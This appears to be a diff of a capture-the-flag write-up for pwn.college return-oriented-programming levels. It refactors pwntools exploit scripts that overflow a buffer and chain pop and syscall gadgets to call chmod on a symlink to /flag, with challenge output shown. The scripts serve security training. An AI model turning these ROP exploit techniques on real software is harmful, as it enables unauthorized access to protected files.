@@ -3136,31 +3136,33 @@ hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ ln -sf /flag ~/!
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
+context.arch = 'amd64'
+
 # Initialize values
-pop_rax_ret_gadget = 0x401da0
-pop_rdi_ret_gadget = 0x401dc8
-pop_rsi_pop_r15_ret_gadget = 0x402021
-syscall_gadget = 0x401db0
+pop_rax = 0x401da0
+pop_rdi = 0x401dc8
+pop_rsi_pop_r15 = 0x402021
+syscall = 0x401db0
 bang_addr = 0x403386
 
 buffer_addr = 0x7ffc3c96a300
 ret_addr = 0x7ffc3c96a348
 
 # Calculate offset
-const_offset = ret_addr - buffer_addr
+offset = ret_addr - buffer_addr
 
 p = process('/challenge/stop-pop-and-rop2-easy')
 
 # Craft payload
-payload = b"A" * const_offset
-payload += p64(pop_rdi_ret_gadget)
-payload += p64(bang_addr)         
-payload += p64(pop_rsi_pop_r15_ret_gadget)
-payload += p64(0o777)  
-payload += b"B" * 8              
-payload += p64(pop_rax_ret_gadget)
-payload += p64(90)                  
-payload += p64(syscall_gadget)
+payload = flat(
+    b"A" * offset,
+
+    # chmod("!", 0o777)
+    pop_rdi, bang_addr,
+    pop_rsi_pop_r15, 0o777, b"B" * 8,
+    pop_rax, 90,
+    syscall
+)
 
 # Send the payload
 p.sendline(payload)
@@ -3169,8 +3171,9 @@ p.interactive()
 
 ```
 hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ python ~/script.py
-[+] Starting local process '/challenge/stop-pop-and-rop2-easy': pid 14667
+[+] Starting local process '/challenge/stop-pop-and-rop2-easy': pid 1025
 [*] Switching to interactive mode
+[*] Process '/challenge/stop-pop-and-rop2-easy' stopped with exit code -11 (SIGSEGV) (pid 1025)
 ###
 ### Welcome to /challenge/stop-pop-and-rop2-easy!
 ###
@@ -3182,7 +3185,7 @@ Received 137 bytes! This is potentially 8 gadgets.
 Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
 from within this challenge. You will have to do that by yourself.
 
-+--- Printing 9 gadgets of ROP chain at 0x7ffc29589d78.
++--- Printing 9 gadgets of ROP chain at 0x7ffeb1061138.
 | 0x0000000000401dc8: pop rdi ; ret  ; 
 | 0x0000000000403386: and dword ptr [rax], eax ; add dword ptr [rbx], ebx ; add edi, dword ptr [rbx] ; je 0x40338e ; add byte ptr [rax], al ; or eax, 0x98000000 ; fdiv st(7), st(0) ; 
 | 0x0000000000402021: pop rsi ; pop r15 ; ret  ; 
@@ -3191,10 +3194,9 @@ from within this challenge. You will have to do that by yourself.
 | 0x0000000000401da0: pop rax ; ret  ; 
 | 0x000000000000005a: (UNMAPPED MEMORY)
 | 0x0000000000401db0: syscall  ; ret  ; 
-| 0x00007ffc29589e0a: sub dword ptr [rdi + rsi*4], ecx ; retf 0x9fc7 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; cwde  ; sahf  ; pop rax ; sub esp, edi ; jg 0x7ffc29589e37 ; add byte ptr [rax - 0x3d6a762], ch ; jg 0x7ffc29589e3f ; add byte ptr [rax + 0x560bdb61], dl ; jl 0x7ffc29589e47 ; add byte ptr [rax], al ; 
+| 0x00007ffeb106120a: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov al, 0x11 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x12], dl ; 
 
 Leaving!
-[*] Process '/challenge/stop-pop-and-rop2-easy' stopped with exit code -11 (SIGSEGV) (pid 14667)
 [*] Got EOF while reading in interactive
 $ 
 ```
@@ -3467,31 +3469,33 @@ hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ ln -sf /flag ~/!
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
+context.arch = 'amd64'
+
 # Initialize values
-pop_rax_ret_gadget = 0x402020
-pop_rdi_ret_gadget = 0x402047
-pop_rsi_pop_r15_ret_gadget = 0x4021c1
-syscall_gadget = 0x40204f
+pop_rax = 0x402020
+pop_rdi = 0x402047
+pop_rsi_pop_r15 = 0x4021c1
+syscall = 0x40204f
 bang_addr = 0x403030
 
 buffer_addr = 0x7ffdc51a0330
 ret_addr = 0x7ffdc51a0378
 
 # Calculate offset
-const_offset = ret_addr - buffer_addr
+offset = ret_addr - buffer_addr
 
 p = process('/challenge/stop-pop-and-rop2-hard')
 
 # Craft payload
-payload = b"A" * const_offset
-payload += p64(pop_rdi_ret_gadget)
-payload += p64(bang_addr)         
-payload += p64(pop_rsi_pop_r15_ret_gadget)
-payload += p64(0o777)  
-payload += b"B" * 8              
-payload += p64(pop_rax_ret_gadget)
-payload += p64(90)                  
-payload += p64(syscall_gadget)
+payload = flat(
+    b"A" * offset,
+
+    # chmod("!", 0o777)
+    pop_rdi, bang_addr,
+    pop_rsi_pop_r15, 0o777, b"B" * 8,
+    pop_rax, 90,
+    syscall
+)
 
 # Send the payload
 p.sendline(payload)
